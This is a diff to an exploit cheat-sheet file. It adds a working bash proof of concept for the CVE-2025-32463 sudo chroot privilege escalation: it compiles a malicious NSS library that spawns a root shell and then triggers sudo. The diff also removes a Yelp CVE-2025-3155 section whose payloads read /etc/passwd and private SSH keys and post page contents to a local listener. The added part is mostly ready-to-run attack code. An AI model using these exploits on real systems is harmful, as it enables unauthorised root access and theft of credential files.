@@ -43,6 +43,7 @@
 - [CVE-2024-47176: EvilCUPS RCE](#cve-2024-47176-evilcups-rce)
 - [CVE-2025-29927: Next.js Authentication Bypass](#cve-2025-29927-nextjs-authentication-bypass)
 - [CVE-2025-3155: Yelp File Read](#cve-2025-3155-yelp-file-read)
+- [CVE-2025-32463: chwoot sudo LPE](#cve-2025-32463-chwoot-sudo-lpe)
 - [GodPotato LPE](#godpotato-lpe)
 - [Juicy Potato LPE](#juicy-potato-lpe)
 - [JuicyPotatoNG LPE](#juicypotatong-lpe)
@@ -193,6 +194,7 @@
 | CVE-2025-29927 | Next.js Authentication Bypass | https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware |
 | CVE-2025-3155 | Yelp File Read | https://gist.github.com/parrot409/e970b155358d45b298d7024edd9b17f2 |
 | CVE-2025-30397 | Windows Server 2025 Use-After-Free in JScript.dll (RCE) | https://github.com/mbanyamer/CVE-2025-30397---Windows-Server-2025-JScript-RCE-Use-After-Free- |
+| CVE-2025-32463 | chwoot sudo LPE | https://github.com/pr0v3rbs/CVE-2025-32463_chwoot |
 | CVE-2025-32756 | Multiple Fortinet Products Vunerability (RCE) | https://github.com/kn0x0x/CVE-2025-32756-POC |
 | CVE-2025-33073 | Windows SMB NTLM Reflection | https://github.com/mverschu/CVE-2025-33073 |
 | n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
@@ -2074,70 +2076,6 @@ if __name__ == "__main__":
 
 ```
 
-## CVE-2025-3155: Yelp File Read
-
-> https://gist.github.com/parrot409/e970b155358d45b298d7024edd9b17f2
-
-### XInclude
-
-```html
-<?xml version="1.0" encoding="utf-8"?>
-<page xmlns="http://projectmallard.org/1.0/" id="index">
-  <info>
-    <title type="text">poc</title>
-  </info>
-  <section>
-    <title>
-      <include parse="text" xmlns="http://www.w3.org/2001/XInclude" href="/etc/passwd" />
-    </title>
-  </section>
-</page>
-```
-
-### JavaScript Execution
-
-```html
-<!DOCTYPE html>
-<html>
-<head>
-  <title>poc</title>
-  <script>
-    let payloadPage = `
-<?xml version="1.0" encoding="utf-8"?>
-<page xmlns="http://projectmallard.org/1.0/" id="index">
-  <info>
-    <title type="text">poc</title>
-  </info>
-  <section>
-    <title>
-      <include parse="text" xmlns="http://www.w3.org/2001/XInclude" href="/proc/self/cwd/.ssh/id_rsa"/>
-    </title>
-    <svg:svg xmlns:svg="http://www.w3.org/2000/svg">
-      <svg:script>onload=_=>fetch("http://localhost:4000/",{method:"POST",body:document.body.outerHTML,mode:"no-cors"})</svg:script>
-    </svg:svg>
-  </section>
-</page>
-    `.trim()
-    function exp(){
-      const blob = new Blob([payloadPage], { type: 'text/plain' });
-      const blobURL = URL.createObjectURL(blob);
-
-      const a = document.createElement('a');
-      a.href = blobURL;
-      a.download = 'index.page';
-      document.body.appendChild(a);
-      a.click();
-
-      location = `ghelp:///proc/self/cwd/Downloads`
-    }
-  </script>
-</head>
-<body>
-  <button onclick="exp()">Click Here</button>
-</body>
-</html>
-```
-
 ## CVE-2025-29927: Next.js Authentication Bypass
 
 > https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware
@@ -2212,6 +2150,38 @@ $ curl -H "X-Middleware-Subrequest: middleware" https://<RHOST>/admin
   <button onclick="exp()">Click Here</button>
 </body>
 </html>
+```
+
+## CVE-2025-32463: chwoot sudo LPE
+
+```bash
+#!/bin/bash
+# sudo-chwoot.sh
+# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
+#                  @ Stratascale Cyber Research Unit (CRU)
+STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
+cd ${STAGE?} || exit 1
+
+cat > woot1337.c<<EOF
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void woot(void) {
+  setreuid(0,0);
+  setregid(0,0);
+  chdir("/");
+  execl("/bin/bash", "/bin/bash", NULL);
+}
+EOF
+
+mkdir -p woot/etc libnss_
+echo "passwd: /woot1337" > woot/etc/nsswitch.conf
+cp /etc/group woot/etc
+gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
+
+echo "woot!"
+sudo -R woot woot
+rm -rf ${STAGE?}
 ```
 
 ## GodPotato LPE
